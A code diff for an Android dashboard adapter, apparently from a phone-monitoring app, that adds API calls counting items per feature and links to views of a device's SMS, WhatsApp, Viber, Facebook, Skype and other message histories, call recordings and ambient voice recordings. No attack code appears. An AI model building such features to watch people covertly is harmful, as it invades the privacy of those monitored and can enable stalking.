@@ -13,6 +13,7 @@ package com.jexpa.secondclone.Adapter;
 import android.app.Activity;
 import android.content.Context;
 import android.content.Intent;
+import android.os.AsyncTask;
 import android.support.annotation.NonNull;
 import android.support.v7.widget.RecyclerView;
 import android.util.Log;
@@ -22,8 +23,7 @@ import android.view.ViewGroup;
 import android.widget.ImageView;
 import android.widget.LinearLayout;
 import android.widget.TextView;
-
-import com.jexpa.secondclone.Model.ApplicationUsage;
+import com.jexpa.secondclone.API.APIGetTotalItemOfFeature;
 import com.jexpa.secondclone.Model.Feature;
 import com.jexpa.secondclone.Model.Table;
 import com.jexpa.secondclone.R;
@@ -36,9 +36,7 @@ import com.jexpa.secondclone.View.PhoneCallRecordHistory;
 import com.jexpa.secondclone.View.PhotoHistory;
 import com.jexpa.secondclone.View.SMSHistory;
 import com.jexpa.secondclone.View.URLHistory;
-
 import java.util.ArrayList;
-
 import static com.jexpa.secondclone.Database.Entity.LastTimeGetUpdateEntity.COLUMN_LAST_BBM;
 import static com.jexpa.secondclone.Database.Entity.LastTimeGetUpdateEntity.COLUMN_LAST_FACEBOOK;
 import static com.jexpa.secondclone.Database.Entity.LastTimeGetUpdateEntity.COLUMN_LAST_HANGOUTS;
@@ -85,6 +83,16 @@ public class AdapterFeatureDashboard extends RecyclerView.Adapter<AdapterFeature
         Feature feature = featureList.get(position);
         holder.txtFeatureName.setText(feature.getFeatureName());
         holder.imgFeature.setImageResource(feature.getImage());
+
+        if(!feature.getFunctionName().isEmpty())
+        {
+            if(feature.getFunctionName().equals("GetSMSByDateTime"))
+            {
+                new APIGetTotalItemOfFeature.contactAsyncTask(feature.getFunctionName(),table.getDevice_ID(),context,getSMSType(feature.getFeatureName())).executeOnExecutor(AsyncTask.THREAD_POOL_EXECUTOR);;
+            }
+            else
+                new APIGetTotalItemOfFeature.contactAsyncTask(feature.getFunctionName(),table.getDevice_ID(),context).executeOnExecutor(AsyncTask.THREAD_POOL_EXECUTOR);;
+        }
     }
 
     // Count the number of elements in deviceList
@@ -141,7 +149,11 @@ public class AdapterFeatureDashboard extends RecyclerView.Adapter<AdapterFeature
                 }
                 else if(featureList.get(position).getFeatureName().equals(context.getResources().getString(R.string.PHONE_CALL_RECORDING)))
                 {
-                    setIntentDefault(context,table,"tablePhoneCallRecord",PhoneCallRecordHistory.class);
+                    setIntentForCallRecording(context,table, "GetPhoneRecording");
+                }
+                else if(featureList.get(position).getFeatureName().equals(context.getResources().getString(R.string.AMBIENT_VOICE_RECORDING)))
+                {
+                    setIntentForCallRecording(context,table, "GetAmbients");
                 }
                 else if(featureList.get(position).getFeatureName().equals(context.getResources().getString(R.string.WHATSAPP_HISTORY)))
                 {
@@ -188,6 +200,52 @@ public class AdapterFeatureDashboard extends RecyclerView.Adapter<AdapterFeature
     }
 
     /**
+     * getSMSType is the method of finding out the type of message for which you want to get the total item.
+     */
+    private String getSMSType(String nameFeature)
+    {
+       if(nameFeature.equals(context.getResources().getString(R.string.SMS_HISTORY)))
+        {
+            return "0";
+        }
+        else if(nameFeature.equals(context.getResources().getString(R.string.WHATSAPP_HISTORY)))
+        {
+            return "1";
+        }
+        else if(nameFeature.equals(context.getResources().getString(R.string.VIBER_HISTORY)))
+        {
+            return "3";
+        }
+        else if(nameFeature.equals(context.getResources().getString(R.string.FACEBOOK_HISTORY)))
+        {
+            return "4";
+        }
+        else if(nameFeature.equals(context.getResources().getString(R.string.SKYPE_HISTORY)))
+        {
+            return "5";
+        }
+        else if(nameFeature.equals(context.getResources().getString(R.string.HANGOUTS_HISTORY)))
+        {
+            return "9";
+        }
+        else if(nameFeature.equals(context.getResources().getString(R.string.BBM_HISTORY)))
+        {
+            return "10";
+        }
+        else if(nameFeature.equals(context.getResources().getString(R.string.LINE_HISTORY)))
+        {
+            return "11";
+        }
+        else if(nameFeature.equals(context.getResources().getString(R.string.KIK_HISTORY)))
+        {
+            return "12";
+        }
+        else {
+           return "0";
+       }
+    }
+
+    /**
      * setIntentForMessage this is a method that supports moving the screen to SMSHistory activity for each type of application.
      */
     private void setIntentForMessage(Context context,Table table, String tableName, String columnName, String type)
@@ -197,6 +255,17 @@ public class AdapterFeatureDashboard extends RecyclerView.Adapter<AdapterFeature
         intent.putExtra("nameTable", tableName + "");
         intent.putExtra("style", type);
         intent.putExtra("nameFeature", columnName + "");
+        context.startActivity(intent);
+    }
+
+    /**
+     * setIntentForMessage this is a method that supports moving the screen to SMSHistory activity for each type of application.
+     */
+    private void setIntentForCallRecording(Context context,Table table, String nameFeature)
+    {
+        Intent intent = new Intent(context, PhoneCallRecordHistory.class);
+        intent.putExtra("tablePhoneCallRecord", table);
+        intent.putExtra("nameFeature", nameFeature + "");
         context.startActivity(intent);
     }
 
